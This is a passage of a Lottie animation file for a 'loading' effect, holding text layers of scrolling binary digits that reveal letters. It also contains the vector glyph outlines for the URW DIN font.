          mn: "ADBE Vector Group",
          hd: !1,
          _render: !0,
        },
      ],
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 6,
      ty: 5,
      nm: "A",
      tt: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: {
          a: 1,
          k: [
            {
              i: { x: 0.67, y: 1 },
              o: { x: 0.75, y: 0 },
              t: 0,
              s: [163.246, 68.993, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 0.25 },
              o: { x: 0.75, y: 0.75 },
              t: 40,
              s: [163.246, -40.507, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 1 },
              o: { x: 0.33, y: 0 },
              t: 65,
              s: [163.246, -40.507, 0],
              to: null,
              ti: null,
            },
            { t: 119, s: [163.246, -482.507, 0] },
          ],
          ix: 2,
        },
        a: { a: 0, k: [0.123, 618.493, 0], ix: 1 },
        s: { a: 0, k: [100, 100, 100], ix: 6 },
      },
      ao: 0,
      t: {
        d: {
          k: [
            {
              s: {
                s: 46,
                f: "URWDIN-Medium",
                t: "1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\rA\r0\r1\r0\r1\r0\r1\r0\r1\r0\r",
                j: 2,
                tr: 0,
                lh: 55.2000007629395,
                ls: 0,
                fc: [0.3333, 0, 0.5098, 1],
              },
              t: 0,
            },
          ],
        },
        p: {},
        m: { g: 1, a: { a: 0, k: [0, 0], ix: 2 } },
        a: [],
      },
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 7,
      ty: 4,
      nm: "Shape Layer 5",
      td: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: { a: 0, k: [198, 96.5, 0], ix: 2 },
        a: { a: 0, k: [-2, -3.5, 0], ix: 1 },
        s: { a: 0, k: [116, 116, 100], ix: 6 },
      },
      ao: 0,
      shapes: [
        {
          ty: "gr",
          it: [
            {
              ty: "rc",
              d: 1,
              s: { a: 0, k: [258, 33], ix: 2 },
              p: { a: 0, k: [0, 0], ix: 3 },
              r: { a: 0, k: 0, ix: 4 },
              nm: "Rectangle Path 1",
              mn: "ADBE Vector Shape - Rect",
              hd: !1,
              _render: !0,
            },
            {
              ty: "fl",
              c: { a: 0, k: [0.986, 0.96, 1, 1], ix: 4 },
              o: { a: 0, k: 100, ix: 5 },
              r: 1,
              bm: 0,
              nm: "Fill 1",
              mn: "ADBE Vector Graphic - Fill",
              hd: !1,
              _render: !0,
            },
            {
              ty: "tr",
              p: { a: 0, k: [-2, -3.5], ix: 2 },
              a: { a: 0, k: [0, 0], ix: 1 },
              s: { a: 0, k: [100, 100], ix: 3 },
              r: { a: 0, k: 0, ix: 6 },
              o: { a: 0, k: 100, ix: 7 },
              sk: { a: 0, k: 0, ix: 4 },
              sa: { a: 0, k: 0, ix: 5 },
              nm: "Transform",
              _render: !0,
            },
          ],
          nm: "Rectangle 1",
          np: 3,
          cix: 2,
          bm: 0,
          ix: 1,
          mn: "ADBE Vector Group",
          hd: !1,
          _render: !0,
        },
      ],
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 8,
      ty: 5,
      nm: "D",
      tt: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: {
          a: 1,
          k: [
            {
              i: { x: 0.67, y: 1 },
              o: { x: 0.75, y: 0 },
              t: 0,
              s: [199.02, -427.507, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 0.25 },
              o: { x: 0.75, y: 0.75 },
              t: 40,
              s: [199.02, -372.007, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 1 },
              o: { x: 0.33, y: 0 },
              t: 65,
              s: [199.02, -372.007, 0],
              to: null,
              ti: null,
            },
            { t: 119, s: [199.02, 676.493, 0] },
          ],
          ix: 2,
        },
        a: { a: 0, k: [0.62, 618.493, 0], ix: 1 },
        s: { a: 0, k: [100, 100, 100], ix: 6 },
      },
      ao: 0,
      t: {
        d: {
          k: [
            {
              s: {
                s: 46,
                f: "URWDIN-Medium",
                t: "1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\rD\r0\r1\r0\r",
                j: 2,
                tr: 0,
                lh: 55.2000007629395,
                ls: 0,
                fc: [0.3333, 0, 0.5098, 1],
              },
              t: 0,
            },
          ],
        },
        p: {},
        m: { g: 1, a: { a: 0, k: [0, 0], ix: 2 } },
        a: [],
      },
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 9,
      ty: 4,
      nm: "Shape Layer 6",
      td: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: { a: 0, k: [198, 96.5, 0], ix: 2 },
        a: { a: 0, k: [-2, -3.5, 0], ix: 1 },
        s: { a: 0, k: [116, 116, 100], ix: 6 },
      },
      ao: 0,
      shapes: [
        {
          ty: "gr",
          it: [
            {
              ty: "rc",
              d: 1,
              s: { a: 0, k: [258, 33], ix: 2 },
              p: { a: 0, k: [0, 0], ix: 3 },
              r: { a: 0, k: 0, ix: 4 },
              nm: "Rectangle Path 1",
              mn: "ADBE Vector Shape - Rect",
              hd: !1,
              _render: !0,
            },
            {
              ty: "fl",
              c: { a: 0, k: [0.986, 0.96, 1, 1], ix: 4 },
              o: { a: 0, k: 100, ix: 5 },
              r: 1,
              bm: 0,
              nm: "Fill 1",
              mn: "ADBE Vector Graphic - Fill",
              hd: !1,
              _render: !0,
            },
            {
              ty: "tr",
              p: { a: 0, k: [-2, -3.5], ix: 2 },
              a: { a: 0, k: [0, 0], ix: 1 },
              s: { a: 0, k: [100, 100], ix: 3 },
              r: { a: 0, k: 0, ix: 6 },
              o: { a: 0, k: 100, ix: 7 },
              sk: { a: 0, k: 0, ix: 4 },
              sa: { a: 0, k: 0, ix: 5 },
              nm: "Transform",
              _render: !0,
            },
          ],
          nm: "Rectangle 1",
          np: 3,
          cix: 2,
          bm: 0,
          ix: 1,
          mn: "ADBE Vector Group",
          hd: !1,
          _render: !0,
        },
      ],
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 10,
      ty: 5,
      nm: "I",
      tt: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: {
          a: 1,
          k: [
            {
              i: { x: 0.67, y: 1 },
              o: { x: 0.75, y: 0 },
              t: 0,
              s: [234.793, 13.993, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 0.25 },
              o: { x: 0.75, y: 0.75 },
              t: 40,
              s: [234.793, 179.993, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 1 },
              o: { x: 0.33, y: 0 },
              t: 65,
              s: [234.793, 179.993, 0],
              to: null,
              ti: null,
            },
            { t: 119, s: [234.793, 676.493, 0] },
          ],
          ix: 2,
        },
        a: { a: 0, k: [0.088, 618.493, 0], ix: 1 },
        s: { a: 0, k: [100, 100, 100], ix: 6 },
      },
      ao: 0,
      t: {
        d: {
          k: [
            {
              s: {
                s: 46,
                f: "URWDIN-Medium",
                t: "1\r0\r1\r0\r1\r0\r1\r0\r1\r0\rI\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r",
                j: 2,
                tr: 0,
                lh: 55.2000007629395,
                ls: 0,
                fc: [0.3333, 0, 0.5098, 1],
              },
              t: 0,
            },
          ],
        },
        p: {},
        m: { g: 1, a: { a: 0, k: [0, 0], ix: 2 } },
        a: [],
      },
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 11,
      ty: 4,
      nm: "Shape Layer 7",
      td: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: { a: 0, k: [198, 96.5, 0], ix: 2 },
        a: { a: 0, k: [-2, -3.5, 0], ix: 1 },
        s: { a: 0, k: [116, 116, 100], ix: 6 },
      },
      ao: 0,
      shapes: [
        {
          ty: "gr",
          it: [
            {
              ty: "rc",
              d: 1,
              s: { a: 0, k: [258, 33], ix: 2 },
              p: { a: 0, k: [0, 0], ix: 3 },
              r: { a: 0, k: 0, ix: 4 },
              nm: "Rectangle Path 1",
              mn: "ADBE Vector Shape - Rect",
              hd: !1,
              _render: !0,
            },
            {
              ty: "fl",
              c: { a: 0, k: [0.986, 0.96, 1, 1], ix: 4 },
              o: { a: 0, k: 100, ix: 5 },
              r: 1,
              bm: 0,
              nm: "Fill 1",
              mn: "ADBE Vector Graphic - Fill",
              hd: !1,
              _render: !0,
            },
            {
              ty: "tr",
              p: { a: 0, k: [-2, -3.5], ix: 2 },
              a: { a: 0, k: [0, 0], ix: 1 },
              s: { a: 0, k: [100, 100], ix: 3 },
              r: { a: 0, k: 0, ix: 6 },
              o: { a: 0, k: 100, ix: 7 },
              sk: { a: 0, k: 0, ix: 4 },
              sa: { a: 0, k: 0, ix: 5 },
              nm: "Transform",
              _render: !0,
            },
          ],
          nm: "Rectangle 1",
          np: 3,
          cix: 2,
          bm: 0,
          ix: 1,
          mn: "ADBE Vector Group",
          hd: !1,
          _render: !0,
        },
      ],
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 12,
      ty: 5,
      nm: "N",
      tt: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: {
          a: 1,
          k: [
            {
              i: { x: 0.67, y: 1 },
              o: { x: 0.75, y: 0 },
              t: 0,
              s: [270.566, -261.257, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 0.25 },
              o: { x: 0.75, y: 0.75 },
              t: 40,
              s: [270.566, -316.757, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 1 },
              o: { x: 0.33, y: 0 },
              t: 65,
              s: [270.566, -316.757, 0],
              to: null,
              ti: null,
            },
            { t: 119, s: [270.566, -483.757, 0] },
          ],
          ix: 2,
        },
        a: { a: 0, k: [0.117, 618.493, 0], ix: 1 },
        s: { a: 0, k: [100, 100, 100], ix: 6 },
      },
      ao: 0,
      t: {
        d: {
          k: [
            {
              s: {
                s: 46,
                f: "URWDIN-Medium",
                t: "1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\rN\r1\r0\r1\r0\r",
                j: 2,
                tr: 0,
                lh: 55.2000007629395,
                ls: 0,
                fc: [0.3333, 0, 0.5098, 1],
              },
              t: 0,
            },
          ],
        },
        p: {},
        m: { g: 1, a: { a: 0, k: [0, 0], ix: 2 } },
        a: [],
      },
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 13,
      ty: 4,
      nm: "Shape Layer 8",
      td: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: { a: 0, k: [198, 96.5, 0], ix: 2 },
        a: { a: 0, k: [-2, -3.5, 0], ix: 1 },
        s: { a: 0, k: [116, 116, 100], ix: 6 },
      },
      ao: 0,
      shapes: [
        {
          ty: "gr",
          it: [
            {
              ty: "rc",
              d: 1,
              s: { a: 0, k: [258, 33], ix: 2 },
              p: { a: 0, k: [0, 0], ix: 3 },
              r: { a: 0, k: 0, ix: 4 },
              nm: "Rectangle Path 1",
              mn: "ADBE Vector Shape - Rect",
              hd: !1,
              _render: !0,
            },
            {
              ty: "fl",
              c: { a: 0, k: [0.986, 0.96, 1, 1], ix: 4 },
              o: { a: 0, k: 100, ix: 5 },
              r: 1,
              bm: 0,
              nm: "Fill 1",
              mn: "ADBE Vector Graphic - Fill",
              hd: !1,
              _render: !0,
            },
            {
              ty: "tr",
              p: { a: 0, k: [-2, -3.5], ix: 2 },
              a: { a: 0, k: [0, 0], ix: 1 },
              s: { a: 0, k: [100, 100], ix: 3 },
              r: { a: 0, k: 0, ix: 6 },
              o: { a: 0, k: 100, ix: 7 },
              sk: { a: 0, k: 0, ix: 4 },
              sa: { a: 0, k: 0, ix: 5 },
              nm: "Transform",
              _render: !0,
            },
          ],
          nm: "Rectangle 1",
          np: 3,
          cix: 2,
          bm: 0,
          ix: 1,
          mn: "ADBE Vector Group",
          hd: !1,
          _render: !0,
        },
      ],
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
    {
      ddd: 0,
      ind: 14,
      ty: 5,
      nm: "G",
      tt: 1,
      sr: 1,
      ks: {
        o: { a: 0, k: 100, ix: 11 },
        r: { a: 0, k: 0, ix: 10 },
        p: {
          a: 1,
          k: [
            {
              i: { x: 0.67, y: 1 },
              o: { x: 0.75, y: 0 },
              t: 0,
              s: [306.339, -97.507, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 0.25 },
              o: { x: 0.75, y: 0.75 },
              t: 40,
              s: [306.339, -207.507, 0],
              to: null,
              ti: null,
            },
            {
              i: { x: 0.25, y: 1 },
              o: { x: 0.33, y: 0 },
              t: 65,
              s: [306.339, -207.507, 0],
              to: null,
              ti: null,
            },
            { t: 119, s: [306.339, 676.493, 0] },
          ],
          ix: 2,
        },
        a: { a: 0, k: [0.339, 618.493, 0], ix: 1 },
        s: { a: 0, k: [100, 100, 100], ix: 6 },
      },
      ao: 0,
      t: {
        d: {
          k: [
            {
              s: {
                s: 46,
                f: "URWDIN-Medium",
                t: "1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\r0\r1\rG\r1\r0\r1\r0\r1\r0\r",
                j: 2,
                tr: 0,
                lh: 55.2000007629395,
                ls: 0,
                fc: [0.3333, 0, 0.5098, 1],
              },
              t: 0,
            },
          ],
        },
        p: {},
        m: { g: 1, a: { a: 0, k: [0, 0], ix: 2 } },
        a: [],
      },
      ip: 0,
      op: 120,
      st: 0,
      bm: 0,
      completed: !0,
    },
  ],
  markers = [],
  chars = [
    {
      ch: "1",
      size: 46,
      style: "Medium",
      w: 54,
      data: {
        shapes: [
          {
            ty: "gr",
            it: [
              {
                ind: 0,
                ty: "sh",
                ix: 1,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [23.264, 0],
                      [34.039, 0],
                      [34.039, -71.906],
                      [26.788, -71.906],
                      [7.956, -63.849],
                      [11.279, -55.591],
                      [23.264, -60.727],
                    ],
                    o: [
                      [23.264, 0],
                      [34.039, 0],
                      [34.039, -71.906],
                      [26.788, -71.906],
                      [7.956, -63.849],
                      [11.279, -55.591],
                      [23.264, -60.727],
                    ],
                    v: [
                      [23.264, 0],
                      [34.039, 0],
                      [34.039, -71.906],
                      [26.788, -71.906],
                      [7.956, -63.849],
                      [11.279, -55.591],
                      [23.264, -60.727],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "1",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                p: { k: [0, 0], a: 0 },
                s: { k: [46, 46], a: 0 },
                a: { k: [0, 0], a: 0 },
                r: { k: 0, a: 0 },
                o: { k: 100, a: 0 },
                sk: { k: 0, a: 0 },
                sa: { k: 0, a: 0 },
                ty: "tr",
                _render: !0,
              },
            ],
            nm: "1",
            np: 3,
            cix: 2,
            bm: 0,
            ix: 1,
            mn: "ADBE Vector Group",
            hd: !1,
            _render: !0,
          },
          { ty: "no", _render: !0 },
        ],
        ip: 0,
        op: 99999,
        st: 0,
        sr: 1,
        ks: {
          p: { k: [0, 0], a: 0 },
          s: { k: [100, 100], a: 0 },
          a: { k: [0, 0], a: 0 },
          r: { k: 0, a: 0 },
          o: { k: 100, a: 0 },
        },
      },
      fFamily: "URW DIN",
    },
    { ch: "\r", size: 46, style: "Medium", w: 0, fFamily: "URW DIN" },
    {
      ch: "0",
      size: 46,
      style: "Medium",
      w: 54,
      data: {
        shapes: [
          {
            ty: "gr",
            it: [
              {
                ind: 0,
                ty: "sh",
                ix: 1,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [6.042, -25.882],
                      [7.151, -11.179],
                      [18.933, 1.007],
                      [39.88, -1.0069999999999997],
                      [48.34, -16.113],
                      [48.34, -46.024],
                      [47.132, -60.727000000000004],
                      [35.449, -72.913],
                      [14.401, -70.697],
                      [6.042, -55.793],
                    ],
                    o: [
                      [6.042, -16.919000000000004],
                      [13.495000000000001, -1.6110000000000007],
                      [34.945, 1.007],
                      [46.93, -10.272],
                      [48.34, -25.882],
                      [48.34, -54.886],
                      [40.787, -70.395],
                      [19.436, -72.913],
                      [7.352, -61.632999999999996],
                      [6.042, -46.024],
                    ],
                    v: [
                      [6.042, -25.882],
                      [9.769, -7.251],
                      [26.788, 1.007],
                      [43.707, -6.042],
                      [48.34, -25.882],
                      [48.34, -46.024],
                      [44.614, -64.655],
                      [26.788, -72.913],
                      [10.675, -65.863],
                      [6.042, -46.024],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "0",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                ind: 1,
                ty: "sh",
                ix: 2,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [37.766, -26.889],
                      [34.845, -7.755],
                      [16.617, -13.091999999999999],
                      [16.617, -45.016],
                      [19.537, -64.151],
                      [37.766, -58.914],
                    ],
                    o: [
                      [37.766, -12.991],
                      [19.537, -7.755],
                      [16.617, -26.889],
                      [16.617, -58.813],
                      [34.845, -64.151],
                      [37.766, -45.016],
                    ],
                    v: [
                      [37.766, -26.889],
                      [27.09, -7.755],
                      [16.617, -26.889],
                      [16.617, -45.016],
                      [27.09, -64.151],
                      [37.766, -45.016],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "0",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                p: { k: [0, 0], a: 0 },
                s: { k: [46, 46], a: 0 },
                a: { k: [0, 0], a: 0 },
                r: { k: 0, a: 0 },
                o: { k: 100, a: 0 },
                sk: { k: 0, a: 0 },
                sa: { k: 0, a: 0 },
                ty: "tr",
                _render: !0,
              },
            ],
            nm: "0",
            np: 5,
            cix: 2,
            bm: 0,
            ix: 1,
            mn: "ADBE Vector Group",
            hd: !1,
            _render: !0,
          },
          { ty: "no", _render: !0 },
        ],
        ip: 0,
        op: 99999,
        st: 0,
        sr: 1,
        ks: {
          p: { k: [0, 0], a: 0 },
          s: { k: [100, 100], a: 0 },
          a: { k: [0, 0], a: 0 },
          r: { k: 0, a: 0 },
          o: { k: 100, a: 0 },
        },
      },
      fFamily: "URW DIN",
    },
    {
      ch: "G",
      size: 46,
      style: "Medium",
      w: 66.1,
      data: {
        shapes: [
          {
            ty: "gr",
            it: [
              {
                ind: 0,
                ty: "sh",
                ix: 1,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [35.449, -30.212],
                      [48.944, -30.212],
                      [48.944, -24.673],
                      [44.010000000000005, -7.755],
                      [18.732, -13.495000000000001],
                      [18.732, -42.7],
                      [22.861000000000004, -63.95],
                      [46.426, -60.123000000000005],
                      [57.404, -53.476],
                      [48.339000000000006, -72.711],
                      [18.128, -70.294],
                      [7.956, -54.483000000000004],
                      [7.956, -28.4],
                      [9.165000000000001, -12.589],
                      [23.666000000000004, 1.007],
                      [49.849999999999994, -1.612],
                      [59.619, -17.019999999999996],
                      [59.619, -38.571],
                      [35.449, -38.571],
                    ],
                    o: [
                      [35.449, -30.212],
                      [48.944, -30.212],
                      [48.944, -13.292999999999997],
                      [22.861, -7.755],
                      [18.732, -29.004],
                      [18.732, -58.108000000000004],
                      [41.693000000000005, -63.95],
                      [47.433, -52.771],
                      [56.699000000000005, -66.065],
                      [24.270000000000003, -72.711],
                      [9.467, -60.324000000000005],
                      [7.956, -43.405],
                      [7.956, -18.128],
                      [17.02, -1.8130000000000006],
                      [43.304, 1.007],
                      [58.208999999999996, -11.683],
                      [59.619, -26.99],
                      [59.619, -38.571],
                      [35.449, -38.571],
                    ],
                    v: [
                      [35.449, -30.212],
                      [48.944, -30.212],
                      [48.944, -24.673],
                      [33.838, -7.755],
                      [18.732, -29.004],
                      [18.732, -42.7],
                      [33.737, -63.95],
                      [47.433, -52.771],
                      [57.404, -53.476],
                      [33.334, -72.711],
                      [13.596, -65.057],
                      [7.956, -43.405],
                      [7.956, -28.4],
                      [12.589, -7.956],
                      [34.039, 1.007],
                      [54.382, -7.05],
                      [59.619, -26.99],
                      [59.619, -38.571],
                      [35.449, -38.571],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "G",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                p: { k: [0, 0], a: 0 },
                s: { k: [46, 46], a: 0 },
                a: { k: [0, 0], a: 0 },
                r: { k: 0, a: 0 },
                o: { k: 100, a: 0 },
                sk: { k: 0, a: 0 },
                sa: { k: 0, a: 0 },
                ty: "tr",
                _render: !0,
              },
            ],
            nm: "G",
            np: 3,
            cix: 2,
            bm: 0,
            ix: 1,
            mn: "ADBE Vector Group",
            hd: !1,
            _render: !0,
          },
          { ty: "no", _render: !0 },
        ],
        ip: 0,
        op: 99999,
        st: 0,
        sr: 1,
        ks: {
          p: { k: [0, 0], a: 0 },
          s: { k: [100, 100], a: 0 },
          a: { k: [0, 0], a: 0 },
          r: { k: 0, a: 0 },
          o: { k: 100, a: 0 },
        },
      },
      fFamily: "URW DIN",
    },
    {
      ch: "N",
      size: 46,
      style: "Medium",
      w: 71.8,
      data: {
        shapes: [
          {
            ty: "gr",
            it: [
              {
                ind: 0,
                ty: "sh",
                ix: 1,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [9.668, 0],
                      [20.142, 0],
                      [20.142, -53.778],
                      [52.167, 0],
                      [62.64, 0],
                      [62.64, -71.906],
                      [52.167, -71.906],
                      [52.167, -18.127],
                      [20.142, -71.906],
                      [9.668, -71.906],
                    ],
                    o: [
                      [9.668, 0],
                      [20.142, 0],
                      [20.142, -53.778],
                      [52.167, 0],
                      [62.64, 0],
                      [62.64, -71.906],
                      [52.167, -71.906],
                      [52.167, -18.127],
                      [20.142, -71.906],
                      [9.668, -71.906],
                    ],
                    v: [
                      [9.668, 0],
                      [20.142, 0],
                      [20.142, -53.778],
                      [52.167, 0],
                      [62.64, 0],
                      [62.64, -71.906],
                      [52.167, -71.906],
                      [52.167, -18.127],
                      [20.142, -71.906],
                      [9.668, -71.906],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "N",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                p: { k: [0, 0], a: 0 },
                s: { k: [46, 46], a: 0 },
                a: { k: [0, 0], a: 0 },
                r: { k: 0, a: 0 },
                o: { k: 100, a: 0 },
                sk: { k: 0, a: 0 },
                sa: { k: 0, a: 0 },
                ty: "tr",
                _render: !0,
              },
            ],
            nm: "N",
            np: 3,
            cix: 2,
            bm: 0,
            ix: 1,
            mn: "ADBE Vector Group",
            hd: !1,
            _render: !0,
          },
          { ty: "no", _render: !0 },
        ],
        ip: 0,
        op: 99999,
        st: 0,
        sr: 1,
        ks: {
          p: { k: [0, 0], a: 0 },
          s: { k: [100, 100], a: 0 },
          a: { k: [0, 0], a: 0 },
          r: { k: 0, a: 0 },
          o: { k: 100, a: 0 },
        },
      },
      fFamily: "URW DIN",
    },
    {
      ch: "I",
      size: 46,
      style: "Medium",
      w: 29.9,
      data: {
        shapes: [
          {
            ty: "gr",
            it: [
              {
                ind: 0,
                ty: "sh",
                ix: 1,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [9.668, 0],
                      [20.444, 0],
                      [20.444, -71.906],
                      [9.668, -71.906],
                    ],
                    o: [
                      [9.668, 0],
                      [20.444, 0],
                      [20.444, -71.906],
                      [9.668, -71.906],
                    ],
                    v: [
                      [9.668, 0],
                      [20.444, 0],
                      [20.444, -71.906],
                      [9.668, -71.906],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "I",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                p: { k: [0, 0], a: 0 },
                s: { k: [46, 46], a: 0 },
                a: { k: [0, 0], a: 0 },
                r: { k: 0, a: 0 },
                o: { k: 100, a: 0 },
                sk: { k: 0, a: 0 },
                sa: { k: 0, a: 0 },
                ty: "tr",
                _render: !0,
              },
            ],
            nm: "I",
            np: 3,
            cix: 2,
            bm: 0,
            ix: 1,
            mn: "ADBE Vector Group",
            hd: !1,
            _render: !0,
          },
          { ty: "no", _render: !0 },
        ],
        ip: 0,
        op: 99999,
        st: 0,
        sr: 1,
        ks: {
          p: { k: [0, 0], a: 0 },
          s: { k: [100, 100], a: 0 },
          a: { k: [0, 0], a: 0 },
          r: { k: 0, a: 0 },
          o: { k: 100, a: 0 },
        },
      },
      fFamily: "URW DIN",
    },
    {
      ch: "D",
      size: 46,
      style: "Medium",
      w: 67.5,
      data: {
        shapes: [
          {
            ty: "gr",
            it: [
              {
                ind: 0,
                ty: "sh",
                ix: 1,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [9.668, 0],
                      [33.334, 0],
                      [60.525999999999996, -8.963000000000001],
                      [60.022, -44.312],
                      [51.562000000000005, -72.20800000000001],
                      [9.668, -71.906],
                    ],
                    o: [
                      [9.668, 0],
                      [51.562000000000005, 0.201],
                      [60.022, -27.594],
                      [60.525999999999996, -62.943],
                      [33.334, -71.906],
                      [9.668, -71.906],
                    ],
                    v: [
                      [9.668, 0],
                      [33.334, 0],
                      [60.022, -27.594],
                      [60.022, -44.312],
                      [33.334, -71.906],
                      [9.668, -71.906],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "D",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                ind: 1,
                ty: "sh",
                ix: 2,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [20.444, -8.661],
                      [20.444, -63.245],
                      [31.421, -63.245],
                      [49.145, -57.907000000000004],
                      [49.246, -28.5],
                      [44.11, -8.459999999999999],
                    ],
                    o: [
                      [20.444, -8.661],
                      [20.444, -63.245],
                      [44.11, -63.547],
                      [49.246, -43.405],
                      [49.145, -13.998],
                      [31.421, -8.661],
                    ],
                    v: [
                      [20.444, -8.661],
                      [20.444, -63.245],
                      [31.421, -63.245],
                      [49.246, -43.405],
                      [49.246, -28.5],
                      [31.421, -8.661],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "D",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                p: { k: [0, 0], a: 0 },
                s: { k: [46, 46], a: 0 },
                a: { k: [0, 0], a: 0 },
                r: { k: 0, a: 0 },
                o: { k: 100, a: 0 },
                sk: { k: 0, a: 0 },
                sa: { k: 0, a: 0 },
                ty: "tr",
                _render: !0,
              },
            ],
            nm: "D",
            np: 5,
            cix: 2,
            bm: 0,
            ix: 1,
            mn: "ADBE Vector Group",
            hd: !1,
            _render: !0,
          },
          { ty: "no", _render: !0 },
        ],
        ip: 0,
        op: 99999,
        st: 0,
        sr: 1,
        ks: {
          p: { k: [0, 0], a: 0 },
          s: { k: [100, 100], a: 0 },
          a: { k: [0, 0], a: 0 },
          r: { k: 0, a: 0 },
          o: { k: 100, a: 0 },
        },
      },
      fFamily: "URW DIN",
    },
    {
      ch: "A",
      size: 46,
      style: "Medium",
      w: 69.3,
      data: {
        shapes: [
          {
            ty: "gr",
            it: [
              {
                ind: 0,
                ty: "sh",
                ix: 1,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [45.319, -15.005],
                      [50.354, 0],
                      [62.036, 0],
                      [35.852, -71.906],
                      [25.479, -71.906],
                      [-0.705, 0],
                      [10.977, 0],
                      [16.013, -15.005],
                    ],
                    o: [
                      [45.319, -15.005],
                      [50.354, 0],
                      [62.036, 0],
                      [35.852, -71.906],
                      [25.479, -71.906],
                      [-0.705, 0],
                      [10.977, 0],
                      [16.013, -15.005],
                    ],
                    v: [
                      [45.319, -15.005],
                      [50.354, 0],
                      [62.036, 0],
                      [35.852, -71.906],
                      [25.479, -71.906],
                      [-0.705, 0],
                      [10.977, 0],
                      [16.013, -15.005],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "A",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                ind: 1,
                ty: "sh",
                ix: 2,
                ks: {
                  a: 0,
                  k: {
                    i: [
                      [42.7, -23.666],
                      [18.631, -23.666],
                      [30.716, -58.813],
                    ],
                    o: [
                      [42.7, -23.666],
                      [18.631, -23.666],
                      [30.716, -58.813],
                    ],
                    v: [
                      [42.7, -23.666],
                      [18.631, -23.666],
                      [30.716, -58.813],
                    ],
                    c: !0,
                  },
                  ix: 2,
                },
                nm: "A",
                mn: "ADBE Vector Shape - Group",
                hd: !1,
                _render: !0,
              },
              {
                p: { k: [0, 0], a: 0 },
                s: { k: [46, 46], a: 0 },
                a: { k: [0, 0], a: 0 },
                r: { k: 0, a: 0 },
                o: { k: 100, a: 0 },
                sk: { k: 0, a: 0 },
                sa: { k: 0, a: 0 },
                ty: "tr",
                _render: !0,
              },
            ],
            nm: "A",
            np: 5,
            cix: 2,
            bm: 0,
            ix: 1,
